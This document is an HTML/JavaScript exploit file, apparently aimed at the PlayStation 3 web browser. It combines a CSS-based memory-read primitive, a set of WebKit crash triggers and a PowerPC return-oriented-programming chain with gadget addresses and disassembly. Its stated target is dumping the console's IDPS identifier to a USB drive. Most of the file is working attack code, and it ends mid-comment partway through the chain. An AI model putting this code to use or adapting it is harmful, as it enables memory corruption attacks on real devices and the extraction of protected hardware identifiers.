<html>

<meta http-equiv="Content-Type" content="text/html;charset=utf-8" /><!-- used for rtl-selection-crash -->

<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<style>
#highlighted
{
white-space: pre-wrap;
}
</style>
<script>
		
//var blr = unescape("\u4E80\u0020");
//var mtspr = unescape("\u7C08\u03A6");
//var nop = unescape("\u6000\u0000");


// General / ROS Dump Variables
// -----------------------------------------------------------------------------------------------------------------------
var log_div = logEntry();
// FIXME the new_line requires a different tag on browser than on python console, a replacement algo needs implemented in dbg function call..
 //var new_line = "\r\n"; // Python console tag
var new_line = "<br>"; // browser tag
//
var used_offsets_arr = [80000000];
var usb_fp_rosdump,gadgets,jump_2,jump_1;
var usb_fp_rosdump_addr=0,gadgets_addr=0,jump_2_addr=0,jump_1_addr=0;
//var usb_fp_rosdump_bytecount=0x1B*2;
var usb_fp_rosdump_bytecount=0x1C*2;
var gadgets_bytecount=0x155*2;
var jump_2_bytecount=0x24*2;
var jump_1_bytecount=0x4*2;
// -----------------------------------------------------------------------------------------------------------------------

// Test Variables
// -----------------------------------------------------------------------------------------------------------------------
//var gadget,payload,orig_stack_frame,idps_storage_usb,idps_hex,idps_base,usb_generic_storage,jump_2,jump_1,g,j1,j2;
//var gadget,payload,orig_stack_frame,orig_link_register,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
//var gadget,payload,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
//var gadget,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
var gadget,idps_storage_usb,idps_hex,idps_base,g,j1,j2;
//var payload_addr=0;		
//var orig_stack_frame_addr = 0;
//var orig_link_register_addr = 0;
var gadget_addr=0;
//var jump_1_addr=0;
//var jump_2_addr=0;
var idps_storage_usb_addr=0;
var idps_hex_addr=0;
var idps_base_addr=0;
//var usb_generic_storage_addr = 0;
var init_addr = 0;
// -----------------------------------------------------------------------------------------------------------------------
		
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function readMemoryNew(exploit, address, size)
{
	var str = "local(" + generateExploit(address, size) + ")";
	exploit.style.src = str;
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

function bin2unescape(str, n) {
   var a = [], start=0;
   while(start<str.length) {
   if (a === "\0") {
    str.replace("\0", "\\0");
   }
      a.push(str.slice(start, start+n));
      start+=n;
   }
   return (a.join("" + "\\u"));
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,search_base,search_size,pattern,len)
{
	try
	{
		//var search_base = 0x80150000;
		//var search_size = 0x450000;
		
		var dat = readMemory(search_base, search_size);
		
		// move past "local("
		dat = dat.substr(6, search_size);
		
		// loop for tag
		for (var i = 0; i < (search_size*2); i += 0x10)
		//for (var i = 0; i < (20000*0x10); i += 0x8)
		{
			//if (i > 20000*0x10) {return 0;}
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				
				// loop next 5 bits
				for (var k = 0; k < len; k+=2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					//dbg("Loop: "+(i/0x10));
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		dbg("The string variable named " + name + " could not be located in the search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len,used_offsets,_log_div) //search_base parameter value paased to this function must be aligned on 0x0 or 0x8 same as string allocation
{
	try
	{
		//var exploit=document.getElementById('exploit');
		//var temp=readMemoryNew(exploit,search_base,search_size+6);
		//var dat=temp.substr(6,search_size);	// move past "local
		
		var temp=readMemoryNew(document.getElementById('exploit'),search_base,search_size);
		//temp=temp.substr(0,temp.length-6);
		var dat=temp.substr(6,search_size);
		
		temp=null;
		//var dat=readMemoryNew(exploit,search_base,search_size+6).substr(6,search_size);	// move past "local
		for (var i=0;i<(search_size*2);i+=0x10)	// loop searching for tag every 8 bytes due to alignment
		{
			if (dat.charCodeAt(i/2)==pattern)
			{
				var match=0;
				for (var k=0;k<(len*2);k+=0x2)	// loop next bytes for comparison
				{
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))	// convert to string for comparison
					{
						break;
					}
					match+=1;	// increment match
				}
				if (match==len)	// we got a complete match
				{
					var exploit_addr=search_base+i+2;	// hold exploit addr
					dbg("Found "+name+" at: 0x"+exploit_addr.toString(16),_log_div);	// display the exploit address
					var cont=0;
					if(used_offsets.length>0)
					{
						for(var idx=0;idx<used_offsets.length;idx++)
						{
							if(used_offsets[idx]==exploit_addr)
							{
								cont=1;
								break;
							}
						}
						if(cont==1)
						{
							dbg("0x"+exploit_addr.toString(16)+" is ignored.", _log_div);
							cont=0;
							continue;
						}
					}
					//used_offsets[used_offsets.length] = exploit_addr;
					used_offsets.push(exploit_addr);
					dbg("0x"+exploit_addr.toString(16)+" was added to used_offsets array.", _log_div);
					//mem=dat;
					dat=null;
					exploit=null;
					return exploit_addr;
				}
			}
		}
		//mem=dat;		
		dat=null;
		exploit=null;
		var end_range = search_base+search_size;
		dbg("The string variable named "+name+" could not be located in range 0x"+search_base.toString(16)+" - 0x"+end_range.toString(16), _log_div);
		return 0;
	} 
	catch(e) 
	{
		dbg(e, _log_div);
	}
}

function execBug(bug, address){
	if (bug === "parse-float") {
		var span = document.createElement("div");
		document.getElementById("BodyID").appendChild(span);
		span.innerHTML = -parseFloat("NAN(ffffe" + address.toString(16) + ")");
	}
	else if (bug === "negative-remaining-length-crash") {
		document.write("<frameset cols=\"6,*\"><frame src=\"data:text/html,<frameset cols='*,*,50%'><frame><frame><frame></frameset>\"><frame src='data:text/html,<p>if you see this, writeHTML failed</p>'></frameset>");
	}
	else if (bug === "dns-prefetch-control") {
		document.location.href = "triggers/dns-prefetch-control.html";
	}
	else if (bug === "crash-on-clear-selection") {
		document.location.href = "triggers/crash-on-clear-selection.html";
	}
	else if (bug === "changing-frame-hierarchy-in-onload") {
		document.location.href = "triggers/changing-frame-hierarchy-in-onload.html";
		//document.write = "<iframe id=\"crashtest2\" src=\"/crash-this-fucking-ps3/now.html\"></iframe>";
		//document.write = "window.onload = function () {document.body.appendChild(document.getElementById('crashtest2'));}";
		//document.write = "setTimeout(stop, 0);"
		//location.reload();
	}
	else if (bug === "canvas-toDataURL-crash") {
		// 0x8FD8D120 r1 --> r0 gets loaded from here 0x8FD8D230
		var canvas = document.getElementById('cr4sh');
		//var url = canvas.toDataURL(gadget);// 0069006D006100670065002F0070006E006700300000002B002500300030002D002D <-- always lands here
		//var url = canvas.toDataURL(a2hex(gadget));// 0069006D006100670065002F0070006E006700300000002B002500300030002D002D <-- always lands here
		var url = canvas.toDataURL(hexh2bin(a2hex(address)) + hexh2bin(a2hex(g)) + hexh2bin(a2hex(gadget)));// 0069006D006100670065002F0070006E006700300000002B002500300030002D002D <-- always lands here
	}
	else if (bug === "insert-span-into-long-text") {
	
		document.location.href = "triggers/insert-span-into-long-text.html";
		
		/*
		//document.write("<html><head><style>#highlighted{white-space: pre-wrap;}</style></head></html>");
		
		var overflow = '_______________________________________________________________________________________________________________________________________' + unescape("\u4141\u2222\u3333\u4444\u5555\u6666\u7777\u8888\u9999\uAAAA\uBBBB\uCCCC\uDDDD\uEEEE\uF111\uF222\uF333\uF444\uF555\uF666\uF777\uF888\uF999\uFAAA\uFBBB\uFCCC\uFDDD\uFEEE\uE111\uE222\uE333\uE444\uE555\uE666\uE777\uE888\uE999\uEAAA\uEBBB\uECCC\uEDDD\uEEEE\uD111\uD222\uD333\uD444\uD555\uD666\uD777\uD888\uD999\uDAAA\uDBBB\uDCCC\uDDDD\uDEEE\uC111\uC222\uC333\uC444\uC555\uC666\uC777\uC888\uC999\uCAAA\uCBBB\uCCCC\uCDDD\uCEEE\uB111\uB222\uB333\uB444\uB555\uB666\uB777\uB888\uB999\uBAAA\uBBBB\uBCCC\uBDDD\uBEEE\uA111\uA222\uA333\uA444\uA555\uA666\uA777\uA888\uA999\uAAAA\uABBB\uACCC\uADDD\uAEEE\u9111\u9222\u9333\u9444\u9555\u9666\u9777\u9888\u9999\u9AAA\u9BBB\u9CCC\u9DDD\u9EEE\u8111\u8222\u8333\u8444\u8555\u8666\u8777\u8888\u8999\u8AAA\u8BBB\u8CCC\u8DDD\u8EEE\u7111\u7222\u7333\u7444\u7555\u7666\u7777\u7888\u7999\u7AAA\u7BBB\u7CCC\u7DDD\u7EEE\u6111\u6222\u6333\u6444\u6555\u6666\u6777\u6888\u6999\u6AAA\u6BBB\u6CCC\u6DDD\u6EEE\u5111\u5222\u5333\u5444\u5555\u5666\u5777\u5888\u5999\u5AAA\u5BBB\u5CCC\u5DDD\u5EEE\u4111\u4222\u4333\u4444\u4555\u4666\u4777\u4888\u4999\u4AAA\u4BBB\u4CCC\u4DDD\u4EEE\u3111\u3222\u3333\u3444\u3555\u3666\u3777\u3888\u3999\u3AAA\u3BBB\u3CCC\u3DDD\u3EEE\u2111\u2222\u2333\u2444\u2555\u2666\u2777\u2888\u2999\u2AAA\u2BBB\u2CCC\u2DDD\u2EEE\u1111\u1222\u1333\u1444\u1555\u1666\u1777\u1888\u1999\u1AAA\u1BBB\u1CCC\u1DDD\u1EEE");
		var div = document.getElementById('crashtest1');
		div.innerHTML = '<div>' + overflow + '\n</div>'

		// Test crash
		var sel = getSelection();
		sel.setPosition(div.firstChild, 0);

		var range = sel.getRangeAt(0);
		var span = document.createElement('SPAN');
		range.insertNode(span);
		*/
	}
	else if (bug === "crash-when-reparent-sibling") {
		//document.location.href = "triggers/crash-when-reparent-sibling.html";
		/*
		 r0=0000000003EFC930        r8=0000000080180070       r16=0000000000000000       r24=0000000080400530
		 r1=000000008FD8CB40        r9=0000000080420470       r17=0000000000000000       r25=0000000080400530
		 r2=0000000002D96A40       r10=0000000080414600       r18=FFFFFFFFFFFFFFFE       r26=0000000080436B30
		 r3=00000000804203F0       r11=0000000000000156       r19=0000000000000001       r27=00000000804203F0
		 r4=00000000801FFBC0       r12=00000000016CB3F4       r20=000000008FD8D290       r28=00000000804203F0
		 r5=0000000080421964       r13=000000001000D420       r21=00000000802F4468       r29=00000000804203F0
		 r6=0000000080300C58       r14=0000000000000000       r22=0000000080436B34       r30=0000000002D20218
		 r7=0000000080300C58       r15=0000000000000000       r23=0000000080436B30       r31=00000000804203F0

		xer=0000000020000000       ctr=0000000001C80180        lr=0000000003EFC930     fpscr=A2002100

		 cr=22088082               cr0=EQ cr1=EQ cr2=   cr3=LT cr4=LT cr5=   cr6=LT cr7=EQ

		 pc=0000000003EB77D8           lwz  r0,0x0(r11)
		 */
 
		//document.location.href = "triggers/crash-when-reparent-sibling.html";
		
		// Create a run-in.
		var elem = document.createElement("div");
		elem.id = "run-in";
		elem.innerHTML = unescape("\u1111\u2222\u3333\u4444\u5555\u6666\u7777\u8888\u9999\uAAAA\uB1BB\uCCCC\uDDDD\uEEEE\uF111\uF222\uF333\uF444\uF555\uF666\uF777\uF888\uF999\uFAAA\uFBBB\uFCCC\uFDDD\uFEEE\uE111\uE222\uE333\uE444\uE555\uE666\uE777\uE888\uE999\uEAAA\uEBBB\uECCC\uEDDD\uEEEE\uD111\uD222\uD333\uD444\uD555\uD666\uD777\uD888\uD999\uDAAA\uDBBB\uDCCC\uDDDD\uDEEE\uC111\uC222\uC333\uC444\uC555\uC666\uC777\uC888\uC999\uCAAA\uCBBB\uCCCC\uCDDD\uCEEE\uB111\uB222\uB333\uB444\uB555\uB666\uB777\uB888\uB999\uBAAA\uB2BB\uBCCC\uBDDD\uBEEE\uA111\uA222\uA333\uA444\uA555\uA666\uA777\uA888\uA999\uAAAA\uABBB\uACCC\uADDD\uAEEE\u9111\u9222\u9333\u9444\u9555\u9666\u9777\u9888\u9999\u9AAA\u9BBB\u9CCC\u9DDD\u9EEE\u8111\u8222\u8333\u8444\u8555\u8666\u8777\u8888\u8999\u8AAA\u8BBB\u8CCC\u8DDD\u8EEE\u7111\u7222\u7333\u7444\u7555\u7666\u7777\u7888\u7999\u7AAA\u7BBB\u7CCC\u7DDD\u7EEE\u6111\u6222\u6333\u6444\u6555\u6666\u6777\u6888\u6999\u6AAA\u6BBB\u6CCC\u6DDD\u6EEE\u5111\u5222\u5333\u5444\u5555\u5666\u5777\u5888\u5999\u5AAA\u5BBB\u5CCC\u5DDD\u5EEE\u4111\u4222\u4333\u4444\u4555\u4666\u4777\u4888\u4999\u4AAA\u4BBB\u4CCC\u4DDD\u4EEE\u3111\u3222\u3333\u3444\u3555\u3666\u3777\u3888\u3999\u3AAA\u3BBB\u3CCC\u3DDD\u3EEE\u2111\u2222\u2333\u2444\u2555\u2666\u2777\u2888\u2999\u2AAA\u2BBB\u2CCC\u2DDD\u2EEE\u1111\u1222\u1333\u1444\u1555\u1666\u1777\u1888\u1999\u1AAA\u1BBB\u1CCC\u1DDD\u1EEE\u2222\u2222\u3333\u4444\u9999\u6666\u7777\u8888\u9999\u4444\uB3BB\uCCCC\uDDDD\uEEEE\uF222\uF222\uF333\uF444\uF999\uF666\uF777\uF888\uF999\uF444\uFBBB\uFCCC\uFDDD\uFEEE\uE222\uE222\uE333\uE444\uE999\uE666\uE777\uE888\uE999\uE444\uEBBB\uECCC\uEDDD\uEEEE\uD222\uD222\uD333\uD444\uD999\uD666\uD777\uD888\uD999\uD444\uDBBB\uDCCC\uDDDD\uDEEE\uC222\uC222\uC333\uC444\uC999\uC666\uC777\uC888\uC999\uC444\uCBBB\uCCCC\uCDDD\uCEEE\uB222\uB222\uB333\uB444\uB999\uB666\uB777\uB888\uB999\uB444\uBBBB\uBCCC\uBDDD\uBEEE\u4222\u4222\u4333\u4444\u4999\u4666\u4777\u4888\u4999\u4444\u4BBB\u4CCC\u4DDD\u4EEE\u9222\u9222\u9333\u9444\u9999\u9666\u9777\u9888\u9999\u9444\u9BBB\u9CCC\u9DDD\u9EEE\u8222\u8222\u8333\u8444\u8999\u8666\u8777\u8888\u8999\u8444\u8BBB\u8CCC\u8DDD\u8EEE\u7222\u7222\u7333\u7444\u7999\u7666\u7777\u7888\u7999\u7444\u7BBB\u7CCC\u7DDD\u7EEE\u6222\u6222\u6333\u6444\u6999\u6666\u6777\u6888\u6999\u6444\u6BBB\u6CCC\u6DDD\u6EEE\u9222\u9222\u9333\u9444\u9999\u9666\u9777\u9888\u9999\u9444\u9BBB\u9CCC\u9DDD\u9EEE\u4222\u4222\u4333\u4444\u4999\u4666\u4777\u4888\u4999\u4444\u4BBB\u4CCC\u4DDD\u4EEE\u3222\u3222\u3333\u3444\u3999\u3666\u3777\u3888\u3999\u3444\u3BBB\u3CCC\u3DDD\u3EEE\u2222\u2222\u2333\u2444\u2999\u2666\u2777\u2888\u2999\u2444\u2BBB\u2CCC\u2DDD\u2EEE\u2222\u2222\u2333\u2444\u2999\u2666\u2777\u2888\u2999\u2444\u2BBB\u2CCC\u2DDD\u2EEE\u4242\u4242\u4242\u4242\u4343\u4343\u4343\u4343\u4545\u4545\u4545\u4545\u4646\u4646\u4646\u4646\u4848\u4848\u4848\u4848\u4949\u4949\u4949\u4949\u5151\u5151\u5151\u5151\u5252\u5252\u5252\u5252\u5353\u5353\u5353\u5353\u5454\u5454\u5454\u5454\u5555\u5555\u5555\u5555\u5656\u5656\u5656\u5656\u5858\u5858\u5858\u5858\u5959\u5959\u5959\u5959");
		elem.setAttribute("style", "display: run-in");
		document.body.appendChild(elem);

		// Create a sibling block to the run-in.
		elem = document.createElement("div");
		elem.id = "block-sibling";
		elem.innerHTML = unescape("\u4242\u4242\u4242\u4242\u4343\u4343\u4343\u4343\u4545\u4545\u4545\u4545\u4646\u4646\u4646\u4646\u4848\u4848\u4848\u4848\u4949\u4949\u4949\u4949\u5151\u5151\u5151\u5151\u5252\u5252\u5252\u5252\u5353\u5353\u5353\u5353\u5454\u5454\u5454\u5454\u5555\u5555\u5555\u5555\u5656\u5656\u5656\u5656\u5858\u5858\u5858\u5858\u5959\u5959\u5959\u5959");
		document.body.appendChild(elem);

		// Trigger a re-paint.
		document.body.offsetTop;

		// Add a block child to the run-in.
		elem = document.createElement("div");
		elem.innerHTML = unescape("\u4343\u4343\u4343\u4343");
		elem.setAttribute("style", "display: table");
		document.getElementById("run-in").appendChild(elem);
		
		// Trigger a re-paint.
		document.body.offsetTop;

		// Reparent the run-in's sibling block.
		document.getElementById("exploit").appendChild(document.getElementById("block-sibling"));
	}
	else if (bug === "nodeIndex72inside120") {
		document.location.href = "triggers/nodeIndex72inside120.html";
	}
	else if (bug === "detached-doctype") {
		//document.location.href = "triggers/detached-doctype.html";
		
		var o = document.implementation.createDocumentType('x', null, null);
		var doc = document.implementation.createDocument("doc", null, 0);
		for (i in o) {
			try { o[i]; } catch (e) {}
			try { o[i](); } catch (e) {}
		}
		o.addEventListener("click", function() {}, true);
		o.removeEventListener("click", function() {}, true);
		o.childNodes;
		o.childNodes.item(0);
		o.firstChild;
		document.write(address);
	}
	else if (bug === "delete-button-background-image-none") {
		document.location.href = "triggers/delete-button-background-image-none.html";
		//document.write = "<div id='crashtest2' contenteditable style='background-image: none, url()'></div>";
		//document.getElementById("crashtest2").focus();
	}
	else if (bug === "dispatch-event-no-document") {
		//document.location.href = "triggers/dispatch-event-no-document.html";
		var doctype = document.implementation.createDocumentType(
			'html',
			'-//W3C//DTD XHTML 1.0 Strict//EN',
			'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'
		);

		var evt = document.createEvent("Event");
		evt.initEvent("generic", true, true);
		doctype.addEventListener("generic", address.toString(16), false);
		doctype.dispatchEvent(evt);
	}
	else if (bug === "doctype-event-listener-crash") {
		//document.location.href = "triggers/doctype-event-listener-crash.html";
		var doctype = document.implementation.createDocumentType("html", 0, 0);
		doctype.addEventListener("click", function () { }, false);
	}
	else if (bug === "huge-column-gap-crash") {
		// 1F64 1256 2B9E 0472
		document.location.href = "triggers/huge-column-gap-crash.html";
		//document.write = "<style>body {-webkit-column-width: .600pt;-webkit-column-gap: 2261953074155095154;}</style>";
	}
	else if (bug === "insert-image-on-top-of-directional-text") {
		//document.location.href = "triggers/insert-image-on-top-of-directional-text.html";
		// Select only "the", not the space, LTR text in RTL region.
		document.getSelection().setBaseAndExtent(rtl1.firstChild, 0, rtl1.firstChild, 3);
		document.execCommand('InsertImage', false, address.toString(16));
		// Select only "אחת", not the space, RTL text in RTL region.
		document.getSelection().setBaseAndExtent(rtl2.firstChild, 0, rtl2.firstChild, 3);
		document.execCommand('InsertImage', false, address.toString(16));
		// Select only "the", not the space, LTR text in LTR region.
		document.getSelection().setBaseAndExtent(ltr1.firstChild, 0, ltr1.firstChild, 3);
		document.execCommand('InsertImage', false, address.toString(16));
		// Select only "אחת", not the space, RTL text in LTR region.
		document.getSelection().setBaseAndExtent(ltr2.firstChild, 0, ltr2.firstChild, 3);
		document.execCommand('InsertImage', false, address.toString(16));
	}
	else if (bug === "modify-ua-rules-from-javascript") {
		//document.location.href = "triggers/modify-ua-rules-from-javascript.html";
		var cssRulesList = window.getMatchedCSSRules(document.body, "", false);
		if (cssRulesList) 
		{
			var styleToChange = cssRulesList[0].style;
			var originalMarginTop = styleToChange.marginTop;
			styleToChange.marginTop = "200px";
			styleToChange.marginTop = originalMarginTop;
		}
	}
	else if (bug === "overflow-height-float-not-removed-crash") {
		document.location.href = "triggers/overflow-height-float-not-removed-crash.html";
		//document.write = "<textarea style=\"width: 100%\" rows=\"100000000\"></textarea><object data=\"x\" align=\"left\"></object><textarea rows=\"100000000\"></textarea>";
		/*
		bool overflow = bitmap_.tryAllocN32Pixels(
		SkScalarCeilToInt(bitmapScaleFactor_ * clip_bounds.width()),
		SkScalarCeilToInt(bitmapScaleFactor_ * clip_bounds.height()));
		DCHECK(overflow);
		if (!overflow){
			return 0;
		}
		*/
		//var trig1 = document.getElementById("overflow-trig-1").style;
		//var trig2 = document.getElementById("overflow-trig-2").style;
		//trig1.setProperty("rows", "100000000");
		//trig2.setProperty("rows", "100000000");
	}
	else if (bug === "position-absolute-to-fixed-crash") {
		document.location.href = "triggers/position-absolute-to-fixed-crash.html";
		/*
		document.body.offsetTop;
		var s = document.getElementById("target").style;
		s.setProperty("position", "fixed");
		document.body.offsetTop;
		s.setProperty("overflow", "hidden");
		s.setProperty("height", "0");
		s.setProperty("width", "0");
		document.body.offsetTop;
		s.setProperty("display", "none");
		*/
	}
	else if (bug === "reflected-img-crash") {
		document.location.href = "triggers/reflected-img-crash.html";
	}
	else if (bug === "rtl-selection-crash") {
		//document.location.href = "triggers/rtl-selection-crash.html";
		
		//document.write = "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\" />";
		var div = document.createElement('div');
		div.contentEditable = 'true';
		div.innerHTML = "אחת ש<a id='bar'>תיים </a>שלוש";
		document.body.appendChild(div);
		div.focus();

		var sel = window.getSelection();
		sel.selectAllChildren(bar);
		var range = sel.getRangeAt(0);
		range.insertNode(document.createElement('span'));
		range.detach();

		// This part can be any number of actions, e.g., clicking anywhere on the page also crashes.
		sel.selectAllChildren(bar);
	}
	else {
		return;
	}
	return;
}

function trigger(entrypoint, exploit_addr)
{
	execBug(entrypoint, exploit_addr);
}

function initROP(){

	setInitVariables("test");
	
	disableElement("marked");
	
	try
	{

		/*
		// Find Payload Pointer Address
		dbg("Processing payload string.. Searching for valid offset....");
		
		do{
		payload =  unescape("\u2F2A\u3860\u1004\u3880\u000A\u38A0\u01B6\u3960\u0188\u4400\u0002\u4E80\u0020\u2F2A"); // 16 total bytes after placeholder
		payload_addr = findExploit("payload",payload,0x80150000,0x450000,0x2F2A,0x18);
		}
		while(payload_addr==0);
		*/
		
		/*
		// Find Initial Stack Frame Address Pointer
		// 0x8FD8D5C0 / 0x8FD8F9C0 <-- r1 should be this
		dbg("Processing orig_stack_frame strings.. Searching for valid offset....");
		do{
		orig_stack_frame =  unescape("\uDEAD\u0000\u0000\u8FD8\uD550\uDEAD"); // <-- must point to r1-0x70 [0x8FD8D550]
		orig_stack_frame_addr = findExploit("orig_stack_frame",orig_stack_frame,0x80150000,0x450000,0xDEAD,0x8);
		}
		while(orig_stack_frame_addr==0);
		*/
		
		/*
		// Find Initial Link Register Address Pointer
		// 0x038CE218 / 0x03B2C9D4 <-- lr should be this???
		dbg("Processing orig_link_register strings.. Searching for valid offset....");
		do{
		orig_link_register =  unescape("\uFEED\u0000\u0000\u8FD8\uD5D0\uFEED");
		orig_link_register_addr = findExploit("orig_link_register",orig_link_register,0x80150000,0x450000,0xFEED,0x8);
		}
		while(orig_link_register_addr==0);
		*/
		
		// Find IDPS USB Storage Address
		/*
		/dev_usb000/idps.bin
		\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E
		*/
		dbg("Processing idps_storage_usb strings.. Searching for valid offset....");
		do{
		idps_storage_usb =  unescape("\u2220\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E\u2220");
		idps_storage_usb_addr = findExploit("idps_storage_usb",idps_storage_usb,0x80150000,0x450000,0x2220,0x14);
		}
		while(idps_storage_usb_addr==0);
		
		// Find IDPS Hex Bytes Address
		dbg("Processing idps_hex strings.. Searching for valid offset....");
		do{
		idps_hex =  unescape("\u2F4A\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u2F4A");
		idps_hex_addr = findExploit("idps_hex",idps_hex,0x80150000,0x450000,0x2F4A,0x10);
		}
		while(idps_hex_addr==0);
		
		// Find IDPS Base Address Pointer [0x00735F98]
		dbg("Processing idps_base strings.. Searching for valid offset....");
		do{
		idps_base =  unescape("\u2F5A\u0000\u0000\u0073\u5F98\u2F5A");
		idps_base_addr = findExploit("idps_base",idps_base,0x80150000,0x450000,0x2F5A,0x8);
		}
		while(idps_base_addr==0);
		
		/*
		// Find USB Generic Storage Address Pointer
		// \u2F64\u6576\u5F75\u7362 <-- /dev_usb
		dbg("Processing usb_generic_storage strings.. Searching for valid offset....");
		do{
		usb_generic_storage =  unescape("\uDEDD\u2F64\u6576\u5F75\u7362\uDEDD");
		usb_generic_storage_addr = findExploit("usb_generic_storage",usb_generic_storage,0x80150000,0x450000,0xDEDD,0x8);
		}
		while(usb_generic_storage_addr==0);
		*/
		
		//gadget =  unescape("\u7E2F\u006F\uC0F0\u7E2F"); //for DEX - libc memcpy
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// **************************************************************************************
		// DEX
		// execute gadget #1
		// gadget entry
		/*
		00416BF4 7C0802A6 mfspr      r0,lr
		00416BF8 F821FF91 stdu       r1,-0x70(r1)
		00416BFC F8010080 std        r0,0x80(r1) <-- link register address should be 0x8FD8D5D0
		00416C00 7C832378 mr         r3,r4
		00416C04 7CA42B78 mr         r4,r5
		00416C08 81690034 lwz        r11,0x34(r9)
		00416C0C 81490038 lwz        r10,0x38(r9)
		00416C10 80A90014 lwz        r5,0x14(r9)
		00416C14 80C90028 lwz        r6,0x28(r9)
		00416C18 80E90024 lwz        r7,0x24(r9)
		00416C1C 800B0000 lwz        r0,0x0(r11)
		00416C20 F8410028 std        r2,0x28(r1)
		00416C24 7C0903A6 mtspr      ctr,r0
		00416C28 8109002C lwz        r8,0x2C(r9)
		00416C2C 804B0004 lwz        r2,0x4(r11)
		00416C30 81290030 lwz        r9,0x30(r9)
		00416C34 4E800421 bctrl
		*/
		gadget =  unescape("\u4444\u0041\u6BF4");// r0 [gadget #1]
		
		
		// execute gadget #2
		/*
		00010B24 E80B0010 ld         r0,0x10(r11)                  03 (00010B20) REG PIPE LSU
		00010B28 7C0803A6 mtspr      lr,r0                         01 (00010B24) REG
		00010B2C EBEBFFF8 ld         r31,-0x8(r11)
		00010B30 7D615B78 mr         r1,r11
		00010B34 4E800020 blr 
		*/
		
		// r2 before gadget #1 <-- also used as bridge to gadget #2 after saving stack frame
		gadget =  gadget+unescape("\u0001\u0B24");// r0 [gadget #2]
		
		
		// prepare gadget #3
		gadget =  gadget+unescape("\u0073\u5F98");// r2 after gadget #1
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141");// padding
		
		
		// execute gadget #3
		/*
		0051A3A4 E80100C0 ld         r0,0xC0(r1)                    PIPE
		0051A3A8 7C6307B4 extsw      r3,r3
		0051A3AC EB810090 ld         r28,0x90(r1)
		0051A3B0 EBA10098 ld         r29,0x98(r1)
		0051A3B4 7C0803A6 mtspr      lr,r0
		0051A3B8 EBC100A0 ld         r30,0xA0(r1)
		0051A3BC EBE100A8 ld         r31,0xA8(r1)                   PIPE
		0051A3C0 382100B0 addi       r1,r1,0xB0
		0051A3C4 4E800020 blr 
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0051\uA3A4");// set r0 from r11+0x10 [gadget #3]
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		
		// prepare gadget #4
		gadget =  gadget+unescape("\u0000\u0000\u8014\u0280");// r28
		gadget =  gadget+unescape("\uFFFF\u0000\u8014\u0030");// r29 <-- sets r3 in next gadget [set high bytes to 00000000]
		gadget =  gadget+unescape("\u0000\u0000\u8014\u0300");// r30
		gadget =  gadget+unescape("\u0000\u0000\u8014\u0000");// r31
		
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");// padding
		
		
		// execute gadget #4
		/*
		
		006161B8 81610074 lwz        r11,0x74(r1)
		006161BC 81410078 lwz        r10,0x78(r1)                   PIPE
		006161C0 8101007C lwz        r8,0x7C(r1)
		006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE
		006161C8 80C10084 lwz        r6,0x84(r1)
		006161CC 80A10088 lwz        r5,0x88(r1)                    PIPE
		006161D0 8081008C lwz        r4,0x8C(r1)
		006161D4 80610090 lwz        r3,0x90(r1)                    PIPE
		006161D8 81210094 lwz        r9,0x94(r1)
		006161DC 80010070 lwz        r0,0x70(r1)                    PIPE
		006161E0 913F0024 stw        r9,0x24(r31)
		006161E4 901F0000 stw        r0,0x0(r31)                    PIPE
		006161E8 917F0004 stw        r11,0x4(r31)
		006161EC 915F0008 stw        r10,0x8(r31)                   PIPE
		006161F0 911F000C stw        r8,0xC(r31)
